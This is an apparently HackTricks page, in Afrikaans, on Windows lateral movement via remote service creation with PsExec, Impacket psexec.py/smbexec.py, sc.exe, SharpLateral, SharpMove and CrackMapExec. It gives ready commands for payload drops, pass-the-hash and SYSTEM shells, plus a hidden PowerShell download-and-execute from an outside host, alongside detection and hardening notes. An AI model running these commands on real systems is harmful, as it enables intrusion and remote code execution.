# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe werk hulle

Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op ’n teikenstelsel uit te voer. Die algemene vloei is:

1. Verifieer by die teiken en kry toegang tot die ADMIN$ share oor SMB (TCP/445).
2. Kopieer ’n uitvoerbare lêer, of spesifiseer ’n LOLBAS-opdragreël wat die diens sal uitvoer.
3. Skep ’n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre lêer wys.
4. Begin die diens om die payload uit te voer en vang opsioneel stdin/stdout via ’n named pipe vas.
5. Stop die diens en ruim op (verwyder die diens en enige afgelaaide binêre lêers).

Vereistes/voorvereistes:
- Local Administrator op die teiken (SeCreateServicePrivilege), of eksplisiete regte om dienste op die teiken te skep.
- SMB (445) moet bereikbaar wees en die ADMIN$ share moet beskikbaar wees; Remote Service Management moet deur die host se firewall toegelaat word.
- UAC Remote Restrictions: met plaaslike rekeninge kan token filtering admin-toegang oor die netwerk blokkeer, tensy die ingeboude Administrator gebruik word of LocalAccountTokenFilterPolicy=1 gestel is.
- Kerberos teenoor NTLM: die gebruik van ’n hostname/FQDN maak Kerberos moontlik; verbinding deur IP val dikwels terug na NTLM (en kan in geharde omgewings geblokkeer word).

### Handmatige ScExec/WinExec via sc.exe

Die volgende toon ’n minimale benadering vir die skep van ’n diens. Die diens se image kan ’n afgelaaide EXE wees, of ’n LOLBAS soos cmd.exe of powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Verwag ’n timeout-fout wanneer ’n nie-service EXE begin word; uitvoering vind steeds plaas.
- Om meer OPSEC-vriendelik te bly, verkies fileless commands (cmd /c, powershell -enc) of verwyder dropped artifacts.

Vind meer gedetailleerde stappe by: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling en voorbeelde

### Sysinternals PsExec.exe

- Klassieke administrateurshulpmiddel wat SMB gebruik om PSEXESVC.exe in ADMIN$ te drop, ’n tydelike service (versteknaam PSEXESVC) te installeer en I/O oor named pipes te proxy.
- Voorbeeldgebruike:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Jy kan direk vanaf Sysinternals Live via WebDAV begin:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Laat diensinstallasie-/deïnstallasiegebeurtenisse agter (diensnaam is dikwels PSEXESVC tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.

### Impacket psexec.py (PsExec-agtig)

- Gebruik ’n ingebedde RemCom-agtige diens. Plaas ’n tydelike diensbinêr (gewoonlik met ’n ewekansige naam) via ADMIN$, skep ’n diens (standaard dikwels RemComSvc), en proxieer I/O oor ’n named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakte
- Tydelike EXE in C:\Windows\ (8 willekeurige karakters). Diensnaam is standaard RemComSvc, tensy dit oorskryf word.

### Impacket smbexec.py (SMBExec)

- Skep ’n tydelike diens wat cmd.exe voortbring en ’n named pipe vir I/O gebruik. Vermy gewoonlik die aflaai van ’n volledige EXE payload; beveluitvoering is semi-interaktief.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie lateral movement-metodes, insluitend service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) sluit dienswysiging/-skepping in om 'n opdrag op afstand uit te voer.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Jy kan ook CrackMapExec gebruik om via verskillende backends uit te voer (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, opsporing en artefakte

Tipiese host-/netwerkartefakte wanneer PsExec-like techniques gebruik word:
- Security 4624 (Logon Type 3) en 4672 (Special Privileges) op die teiken vir die admin account wat gebruik is.
- Security 5140/5145 File Share en File Share Detailed events wat ADMIN$-toegang en die skep/skryf van service binaries toon (bv. PSEXESVC.exe of ’n ewekansige 8-karakter .exe).
- Security 7045 Service Install op die teiken: service name soos PSEXESVC, RemComSvc, of custom (-r / -service-name).
- Sysmon 1 (Process Create) vir services.exe of die service image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) vir pipes soos \\.\pipe\psexesvc, \\.\pipe\remcom_*, of gerandomiseerde ekwivalente.
- Registry artifact vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operator host (indien dit nie onderdruk is nie).

Hunting-idees
- Genereer ’n alert vir service installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP-liggings insluit.
- Soek process creations waar ParentImage C:\Windows\PSEXESVC.exe is, of waar children van services.exe as LOCAL SYSTEM loop en shells uitvoer.
- Merk named pipes wat op -stdin/-stdout/-stderr eindig, of bekende PsExec clone-pipe names.

## Foutoplossing van algemene mislukkings
- Access is denied (5) tydens die skep van services: nie werklik local admin nie, UAC remote restrictions vir local accounts, of EDR tampering protection op die service binary path.
- The network path was not found (53) of kon nie aan ADMIN$ koppel nie: firewall blokkeer SMB/RPC, of admin shares is gedeaktiveer.
- Kerberos misluk maar NTLM is geblokkeer: koppel met hostname/FQDN (nie IP nie), verseker korrekte SPNs, of verskaf -k/-no-pass met tickets wanneer Impacket gebruik word.
- Service start times out maar die payload het geloop: verwag indien dit nie ’n werklike service binary is nie; capture output na ’n lêer, of gebruik smbexec vir live I/O.

## Hardening-notas
- Windows 11 24H2 en Windows Server 2025 vereis SMB signing by verstek vir outbound (en Windows 11 inbound) connections. Dit breek nie legitieme PsExec-gebruik met geldige creds nie, maar voorkom unsigned SMB relay abuse en kan toestelle beïnvloed wat nie signing ondersteun nie.<sup>[[2]](#references)</sup>
- Nuwe SMB client NTLM blocking (Windows 11 24H2/Server 2025) kan NTLM fallback voorkom wanneer daar volgens IP of na non-Kerberos servers gekoppel word. In hardened environments sal dit NTLM-based PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of configure exceptions indien dit legitiem nodig is.<sup>[[2]](#references)</sup>
- Principle of least privilege: minimaliseer local admin membership, verkies Just-in-Time/Just-Enough Admin, enforce LAPS, en monitor/genereer alerts vir 7045 service installs.

## Sien ook

- WMI-based remote exec (dikwels meer fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## Verwysings

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
